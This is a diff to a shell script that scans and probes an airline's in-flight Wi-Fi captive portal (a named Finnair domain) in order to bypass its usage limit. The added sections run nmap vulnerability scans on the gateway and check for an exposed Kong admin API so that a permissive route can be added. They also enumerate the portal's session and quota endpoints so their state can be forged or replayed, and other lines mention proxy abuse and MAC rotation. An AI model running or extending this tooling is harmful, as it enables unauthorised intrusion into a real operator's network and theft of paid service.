@@ -142,6 +142,45 @@ for pp in 3128 8080 80 8000; do
   [ -n "$r" ] && { note "  proxy $GW:$pp -> $r"; [ "$r" = "200" ] && hole "http_connect_abuse" "HIGH" "gateway proxies on :$pp" "configure browser proxy $GW:$pp"; }
 done
 
+# ---- 8b. DEEP SCAN (nmap) — gateway attack surface + vuln discovery --------
+sec "8b. DEEP SCAN (nmap: gateway services, vulns, exploitable ports)"
+if have nmap; then
+  note "  [nmap] gateway open ports + service/version:"
+  timeout 90 nmap -Pn -n -T4 --host-timeout 80s -p 22,53,67,80,123,443,3128,5353,8000,8001,8080,8443,9000 -sV "$GW" 2>/dev/null \
+    | rg -i "open|filtered.*(ssh|kong|proxy|admin)|version|kong|squid|PAC" | sed 's/^/    /' | head -25
+  # Kong admin API exposed? (8001/8444 = full gateway control if open)
+  for kp in 8001 8444; do
+    kc=$(timeout 6 xh --print=h "GET" "http://$GW:$kp/" 2>/dev/null | awk 'NR==1{print $2}')
+    [ -n "$kc" ] && { note "    Kong admin :$kp -> $kc"; [ "$kc" = "200" ] && hole "kong_admin_exposed" "HIGH" "Kong admin API open on :$kp = full gateway control (add a route to bypass)" "curl $GW:$kp/routes  # then POST a permissive route"; }
+  done
+  note "  [nmap] vuln scripts on portal (http) — may be slow, best-effort:"
+  timeout 120 nmap -Pn -n -p 80,443 --script "http-title,http-headers,http-methods,http-open-proxy" "$GW" 2>/dev/null \
+    | rg -i "proxy|method|server|title|TRACE|PUT|DELETE" | sed 's/^/    /' | head -15
+else
+  note "  nmap not installed (brew install nmap)"
+fi
+
+# ---- 8c. PORTAL API SURFACE (Panasonic pax-api / enforcement endpoints) -----
+sec "8c. PORTAL API (enforcement/session/quota endpoints — the PoC surface)"
+PORTAL="https://www.nordic-sky.finnair.com"
+note "  real API prefix returns text/plain 404 (vs SPA text/html catch-all):"
+for ep in /api /api/v1 /api/v1/session /api/v1/device /api/v1/status /api/v1/connectivity \
+          /api/session /api/device /api/voucher /api/plan /api/free /api/access; do
+  hdr=$(timeout 6 xh --print=h "GET" "$PORTAL$ep" Accept:application/json 2>/dev/null)
+  code=$(printf '%s' "$hdr" | awk 'NR==1{print $2}')
+  ct=$(printf '%s' "$hdr" | rg -i "^content-type" | head -1 | awk '{print $2}' | tr -d '\r')
+  kong=$(printf '%s' "$hdr" | rg -ci "kong" 2>/dev/null)
+  flag=""
+  # JSON or Kong-backed + non-404 = a real enforcement endpoint worth poking
+  case "$ct" in application/json*) [ "$code" != "404" ] && flag=" <== REAL API (json)";; esac
+  [ "${kong:-0}" != "0" ] && flag="$flag <== KONG-BACKED"
+  note "    $ep -> ${code:-none} ${ct:-} $flag"
+  [ -n "$flag" ] && hole "portal_api_session" "MED" "enforcement endpoint $ep is live ($ct)" \
+       "inspect/replay: xh GET $PORTAL$ep ; look for device/session/quota state to forge or reset"
+done
+note "  -> if a session/device endpoint accepts client-set device-id or returns a"
+note "     quota token, that's the nowifi PoC: forge/replay it to reset the limit."
+
 # ---- 9. captive enforcement model ------------------------------------------
 sec "9. ENFORCEMENT MODEL (how the limit is keyed -> reset vector)"
 note "  your MAC: $SELF_MAC  (if limit is MAC-keyed: mac_rotate = fresh session/quota)"
